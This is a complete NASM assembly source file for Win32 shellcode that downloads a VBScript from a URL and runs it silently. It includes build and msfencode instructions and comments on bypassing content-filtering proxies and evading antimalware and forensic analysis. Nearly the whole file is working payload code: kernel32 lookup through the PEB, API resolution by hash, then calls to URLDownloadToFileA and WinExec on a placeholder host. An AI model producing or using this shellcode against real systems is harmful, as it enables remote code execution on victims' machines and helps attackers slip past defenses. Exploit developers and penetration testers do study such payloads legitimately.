; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
; Download and execute script win32 shellcode
; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
;
; Version 1.1 - Now supporting Windows 7
; Saves data retrieved from URL to PWD (Present Working Directory) as a vbscript file and then runs it using cscript.
;
; What?  Why download and run a script instead of an executable?  
; Short answer: bypassing of content filtering proxies.
; Longer, more detailed answer: http://www.thegreycorner.com/2010/05/download-and-execute-script-shellcode.html
; 
; Modified from "Download & execute" code from here http://www.klake.org/~jt/asmcode/
; Uses URLDownloadToFile, so will use Internet Explorer's proxy settings if configured.
; The running program needs write permissions to the PWD.
; 
; Change URL string at the end then assemble using the following, where this file is saved as descript.asm:
; >nasm -f bin descript.asm -o descript.bin
;
; Then cat into msfencode to encode around bad characters, e.g.
; >cat descript.bin | msfencode -a x86 -b '\x00\x0a\x0d' -t c
;
; OR use something like perl to display in c hash format:
; >cat descript.bin | perl -e 'while (read STDIN, $d, 1) {print "\\x" . sprintf( "%02x", ord($d));}; print "\n"'
;
; Windows 7 Support added using this method courtesy of SkyLined: http://skypher.com/index.php/2009/07/22/shellcode-finding-kernel32-in-windows-7/
;
; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
; Code starts here
; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

[BITS 32]

global _start

_start:
	jmp short startup

; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
; Functions to find kernel32 and to allow calling of other functions in sc
; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

find_kernel32:
	; Below method thanks to SkyLined
	; http://skypher.com/index.php/2009/07/22/shellcode-finding-kernel32-in-windows-7/
	xor ecx, ecx			; set ecx to 0
	mov esi, [fs:ecx + 0x30]	; esi = &(PEB) ([FS:0x30])
	mov esi, [esi + 0x0C]		; esi = PEB->Ldr
	mov esi, [esi + 0x1C]		; esi = PEB->Ldr.InInitOrder
next_module:
	mov ebx, [esi + 0x08]		; ebx = InInitOrder[X].base_address - modified to put in ebx
	mov edi, [esi + 0x20]		; ebp = InInitOrder[X].module_name (unicode)
	mov esi, [esi]                  ; esi = InInitOrder[X].flink (next module)
	cmp [edi + 0x18], cx		; aniway fix for compatibility with win2k modulename[12] == 00 ?
	jne next_module                 ; No: try next module.
	; ebx has the base address of kernel32
	ret


find_function:
	pushad			      ; Save all registers
	mov   ebp, [esp + 0x24]       ; Store the base address in eax
	mov   eax, [ebp + 0x3c]       ; PE header VMA
	mov   edx, [ebp + eax + 0x78] ; Export table relative offset
	add   edx, ebp                ; Export table VMA
	mov   ecx, [edx + 0x18]       ; Number of names
	mov   ebx, [edx + 0x20]       ; Names table relative offset
	add   ebx, ebp                ; Names table VMA

find_function_loop:
	jecxz find_function_finished  ; Jump to the end if ecx is 0
	dec   ecx                     ; Decrement our names counter
	mov   esi, [ebx + ecx * 4]    ; Store the relative offset of the name
	add   esi, ebp                ; Set esi to the VMA of the current name

compute_hash:
	xor   edi, edi                ; Zero edi
	xor   eax, eax                ; Zero eax
	cld                           ; Clear direction

compute_hash_again:
	lodsb                         ; Load the next byte from esi into al
	test  al, al                  ; Test ourselves.
	jz    compute_hash_finished   ; If the ZF is set, we've hit the null term.
	ror   edi, 0xd                ; Rotate edi 13 bits to the right
	add   edi, eax                ; Add the new byte to the accumulator
	jmp   compute_hash_again      ; Next iteration

compute_hash_finished:         
find_function_compare:           
	cmp   edi, [esp + 0x28]       ; Compare the computed hash with the requested hash
	jnz   find_function_loop      ; No match, try the next one.
	mov   ebx, [edx + 0x24]       ; Ordinals table relative offset
	add   ebx, ebp                ; Ordinals table VMA
	mov   cx, [ebx + 2 * ecx]     ; Extrapolate the function's ordinal
	mov   ebx, [edx + 0x1c]       ; Address table relative offset
	add   ebx, ebp                ; Address table VMA
	mov   eax, [ebx + 4 * ecx]    ; Extract the relative function offset from its ordinal
	add   eax, ebp                ; Function VMA
	mov   [esp + 0x1c], eax       ; Overwrite stack version of eax from pushad

find_function_finished:
	popad                         ; Restore all registers
	ret

; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
; Download and Execute Script specific instructions start here
; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

begin:		
	call find_kernel32	; Find kernel32 address
	pop edi			; Address of urlmon: label popped from stack to edi
	sub edi, urlmon-urldata	; Now edi has address of url, like "add edi, urldata-urlmon" without \x0 bytes 	
	jmp short urlmon	; Jump over call statement

startup:
	call begin		; Redirect execution to begin: label, address of next instruction (urlmon:) pushed to stack


urlmon:
	push  0xec0e4e8e	; LoadLibraryA hash
	push ebx		; kernel32 base address
	call find_function	; find address

	; LoadLibraryA (LPCTSTR lpLibFileName)
	xor ecx, ecx		; ecx = 0
	mov cx, 0x6e6f		; Move "on" in cx register, lower two bytes of ecx
	push ecx		; Push null-terminated "on" to stack ("on" + \x0\x0)
	push 0x6d6c7275		; Push "urlm", null terminated "urlmon" on stack
	push esp		; lpLibFileName
	call eax		; eax holds our function address

download:
	push  0x702f1a36	; URLDownloadToFileA hash
	push eax		; urlmon.dll base address
	call find_function	; find address

	; URLDownloadToFileA (LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB);
	xor ecx, ecx		; ecx = 0 for later use
	push ecx		; lpfnCB
	push ecx		; dwReserved
	lea esi, [edi]		; esi gets offset of URL	
	add esi, cmddata-urldata	; Now esi has command to run, same as "sub esi, urldata-cmddata" but without \x0 byte
	lea edx, [esi + 12]	; edx gets script filename from command, downloaded file saved to this name
	push edx		; szFileName
	push edi		; szURL
	push ecx		; pCaller
	call eax		; eax holds our function address

execute:
	push 0x0e8afe98		; WinExec hash
	push ebx		; kernel32 base address
	call find_function	; find address

	; WinExec (LPCSTR lpCmdLine, UINT uCmdShow)
	inc ecx			; ecx = 1
	push ecx		; uCmdShow 
	push esi		; lpCmdLine. We already have the exe path in esi
	call eax		; eax holds our function address

exit:
	push 0x73e2d87e		; ExitProcess hash
	push ebx		; kernel32 base address
	call find_function	; find address

	; ExitProcess (UINT uExitCode)
	call eax		; holds our function address


; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
; Variable data stored here
; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
; I have left zero bytes terminating these strings, so encoding may be necessary in some circumstances.
; Leaving in zero bytes here is OK for JS based shellcode and saves some space, plus allows editing of db strings without modifying other code
; To get rid of 0 bytes, modify code to replace with other character (e.g. 0xff)
; AND use instructions like "mov [edi + 28], cl" (where ecx = 0, edi points to string, 28 is end of string) to replace with \x0 at runtime

cmddata:
; Script command to execute.  File from URL gets saved to disk as the script name specified in command below
; Dont want to drop a .vbs file on disk for forensic analysis or antimalware reasons?  
; (Be aware only the file extension will be changed, not the content)
; Try "wscript //B //e:vbscript a.tmp" and modify this command from above "lea edx, [esi + 12]" to "lea edx, [esi + 25]"
; Otherwise you shouldn't need to change this.

db "wscript //B a.vbs", 0 


urldata:
; Change this to provide your own URL
; File extension in URL DOES matter 
; Extensions .txt and .htm (and possibly more) dont get saved to disk by URLDownloadToFile causing shellcode to fail

db "http://192.168.56.1/test1.tmp", 0

